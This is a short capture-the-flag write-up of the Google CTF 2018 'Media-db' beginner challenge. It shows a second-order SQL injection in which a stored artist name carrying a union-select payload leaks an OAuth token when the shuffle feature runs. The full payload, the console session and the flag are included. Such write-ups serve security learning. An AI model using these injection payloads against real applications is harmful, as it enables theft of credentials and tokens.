At first, the application seems safe. It correctly removes quotes from the
insert parameters and apostrophes from both select queries.  
I also found out that SQLite 3 doesn't support backslash escaping, so we can't
solve it this way. However the application allows us to shuffle artist.  
It chooses random artist from database and then selects all his songs. And
that's what we need. We can without any problems insert artist with
apostrophes in his name to database.  
This name will be later used in SELECT query which uses apostrophes to mark
string. If we set artist name to `'and 1=2 union select 1,oauth_token from
oauth_tokens;--`, this should execute union select query and return
oauth_token instead of song name.  
```  
=== Media DB ===  
1) add song  
2) play artist  
3) play song  
4) shuffle artist  
5) exit  
> 1  
artist name?  
'and'1'='2' union select 1,oauth_token from oauth_tokens;--  
song name?  
any  
1) add song  
2) play artist  
3) play song  
4) shuffle artist  
5) exit  
> 4  
choosing songs from random artist: 'and'1'='2' union select 1,oauth_token from
oauth_tokens;--

== new playlist ==  
1: "CTF{fridge_cast_oauth_token_cahn4Quo}  
" by "1"

1) add song  
2) play artist  
3) play song  
4) shuffle artist  
5) exit  
> 5  
bye  
```

Flag: `CTF{fridge_cast_oauth_token_cahn4Quo}`

Original writeup (https://github.com/BOAKGP/CTF-
Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/Media-
db).